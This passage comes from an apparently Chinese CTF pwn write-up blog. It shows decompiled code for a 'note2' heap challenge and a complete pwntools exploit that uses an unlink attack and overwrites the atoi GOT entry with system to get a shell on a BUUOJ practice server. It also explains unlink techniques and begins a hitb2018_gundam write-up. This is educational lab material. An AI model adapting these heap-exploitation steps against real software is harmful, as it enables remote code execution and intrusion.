class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + ptr) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(ptr + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样的话就可以造成堆溢出</p>
<p>同时注意到add函数只可以add 4次</p>
<p>del</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 id; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  LODWORD(id) = input();</span><br><span class="line">  v2 = id;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)id &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)id &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    id = (__int64)*(&amp;ptr + (<span class="keyword">int</span>)id);</span><br><span class="line">    <span class="keyword">if</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;ptr + v2));</span><br><span class="line">      *(&amp;ptr + v2) = <span class="number">0LL</span>;</span><br><span class="line">      size_list[v2] = <span class="number">0LL</span>;</span><br><span class="line">      LODWORD(id) = <span class="built_in">puts</span>(<span class="string">&quot;delete note success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有置零</p>
<p>show</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (__int64)*(&amp;ptr + (<span class="keyword">int</span>)v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Content is %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)*(&amp;ptr + v2));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="keyword">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">list</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = input();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = (<span class="keyword">char</span> *)*(&amp;ptr + v2);</span><br><span class="line">      size = size_list[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = input();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);                  <span class="comment">// off by null</span></span><br><span class="line">          v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">          <span class="built_in">strcpy</span>(v7, <span class="string">&quot;TheNewContents:&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(v7);</span><br><span class="line">          read_num((__int64)(v7 + <span class="number">15</span>), <span class="number">144LL</span>, <span class="number">10</span>);</span><br><span class="line">          filter(v7 + <span class="number">15</span>);</span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[size - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL);</span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Edit note success!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Error choice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;note has been deleted&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please add a note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到exit和show都会被零截断</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    <span class="comment">#libc =ELF(&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/clr/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29825</span>)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">bps=[],pie =<span class="literal">False</span></span>):</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="comment">#cmd=&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base =<span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#base =int(os.popen(&quot;pmap -x &#123;0&#125; &quot;.format(io.pid)).readlines()[2][:16],16)</span></span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps]) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *$rebase(&#123;:#x&#125;)\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if bps !=[]:</span></span><br><span class="line">    <span class="comment">#     cmd +=&#x27;c&#x27;</span></span><br><span class="line">    pwnlib.gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&#x27;1&#x27;</span>) <span class="comment"># add</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&#x27;2&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># del</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">4</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&#x27;4&#x27;</span>) <span class="comment"># show</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;(less than 128)&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the note content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;id of the note:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, flag, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;the note:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;Size: &quot;, str(size))</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;[1.overwrite/2.append]&quot;</span>, <span class="built_in">str</span>(flag))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Contents:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;id of the note:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;break printf&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;name:\n&quot;</span>, <span class="string">&quot;111&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;address:\n&quot;</span>, <span class="string">&quot;222&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0000000000602120</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>)</span><br><span class="line">payload += p64(bss-<span class="number">0x18</span>) + p64(bss - <span class="number">0x10</span>) <span class="comment"># 通过这里的fd和bk我们用堆重叠可以将原本0x602120的位置的值修改0x602108,因为原本fakechunk的fd为0x602108,那么0x602108的bk就会变成原本fakechunk的bk(unlink让fakechunk脱链了)即设置成它自己,就可以用这个方法修改任意地址</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, payload) <span class="comment"># 第一个堆</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 这个堆有堆溢出,可以修改下一个堆的内容</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;b&quot;</span>) <span class="comment"># 第二个堆用于和第一个堆合并</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">1</span>, payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>): <span class="comment"># 因为会被零截断,在设置fakesize的时候需要把0一个一个填回去</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;\xa0&#x27;</span> * i </span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># 第一个chunk的fakechunk已经和第三个chunk合并了</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment"># 输入atoi的got表地址,show的时候就可以直接show plt得到libc地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">1</span>, payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">1</span>, p64(libc_system)) <span class="comment"># 上一步修改atio的时候602120的位置已经是atoi的got的位置了,我们可以修改为system的地址,直接getshell</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="unlink的两种利用姿势"><a href="#unlink的两种利用姿势" class="headerlink" title="unlink的两种利用姿势"></a>unlink的两种利用姿势</h4><blockquote>
<p>参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4438e7b3b0ed">unlink原理及利用 </a></p>
</blockquote>
<p>伪造一个特殊的chunk，如下图ptr2</p>
<p>![image-20220228222124352](C:\youyue’s blog\source_posts\刷题记录-0x3\image-20220228222124352.png)</p>
<p><strong>关于对于当前块是否正在使用（inused标志位的判定）</strong></p>
<p>判定时，用当前ptr+size得到下一个块的指针地址，然后找到下个指针地址的size的最后一个P标志位，若为0则表示未使用<br>这里ptr2的size位为-8（64位）ptr2-&gt;next就指向了ptr2-0x8的位置，这样的话，ptr2-&gt;next的size就是ptr2 - 0x8 + 0x8的位置,即ptr2的presize的位置,这里设置成偶数,也就是表明ptr2-&gt;next-&gt;pre,即ptr2为unused的状态,这样的话,ptr2就可以向上合并,也就是ptr2这个指针指向的chunk会从unsortedbin这个双向链表(main_arena + 88)被去掉(unlink),即<br>$$<br>FD-&gt;bk = BK=ptr2-&gt;bk \<br>BK-&gt;fd = FD=ptr2-&gt;fd<br>$$<br>这里的FD为free_got-0x18的位置,FD-&gt;bk就是free_got,BK为shellcode address,这样就可以给free的got表写值了</p>
<p><strong>第二种利用姿势</strong></p>
<p>![image-20220228224403004](C:\youyue’s blog\source_posts\刷题记录-0x3\image-20220228224403004.png)</p>
<p>在大堆块里面构造一个小堆块,让小堆块处于unused的状态使得大堆块的后一个chunckfree的时候会向上将伪造的堆块合并,这里需要修改后一个chunk的size的P标志位,并构造fake_presize,大小等于伪造chunk的size,然后再伪造的chunk里面的fd和bk绕过安全检查即可,然后可以做overlap等其他操作</p>
<h3 id="hitb2018-gundam"><a href="#hitb2018-gundam" class="headerlink" title="hitb2018_gundam"></a>hitb2018_gundam</h3><p>checksec</p>
<p>保护全开</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1022(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        distroy();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Exit....&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B7D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="number">0LL</span>;</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( totalnum &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);  <span class="comment">//s存的下面buf的堆地址</span></span><br><span class="line">    <span class="built_in">memset</span>(s, <span 